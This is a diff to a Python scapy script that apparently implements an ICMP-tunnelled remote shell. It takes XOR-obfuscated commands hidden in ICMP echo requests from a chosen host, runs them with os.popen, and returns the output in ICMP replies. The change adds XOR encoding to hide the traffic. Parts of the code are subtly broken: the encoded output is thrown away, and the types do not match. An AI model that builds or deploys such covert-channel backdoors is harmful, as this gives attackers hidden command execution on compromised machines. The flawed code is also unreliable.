@@ -10,11 +10,18 @@ import os
 ICMP_ID = int(13170)
 TTL = int(64)
 
-def enc(payload):
-    xorkey = payload[0]
-    for i in range(1, len(payload - 1)):
-        ret_payload += payload[i] ^ xorkey
-    return payload
+def dec(payload, xorkey):
+    ret = bytearray()
+    for byte in payload:
+        ret += (byte ^ xorkey).to_bytes(1,'big')
+    return ret
+
+def enc(payload, xorkey):
+    arr_payload = bytes(payload, 'utf-8')
+    ret_payload = bytes()
+    for byte in arr_payload:
+        ret_payload += (byte ^ xorkey).to_bytes(1, 'big')
+    return ret_payload
 
 def check_scapy():
     try:
@@ -29,10 +36,11 @@ args = parser.parse_args()
 
 def icmpshell(pkt):
     if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
-        icmppaket = dec(pkt[Raw].load)
-        icmppaket = icmppaket.decode('utf-8', errors='ignore')
+        impacket_raw = dec((pkt[Raw].load), 0x13)
+        icmppaket = impacket_raw.decode('utf-8', errors='ignore')
         payload = os.popen(icmppaket).readlines()
-        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
+        enc(payload, 0x13)
+        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/payload)
         sr(icmppacket, timeout=0, verbose=0)
     else:
         pass
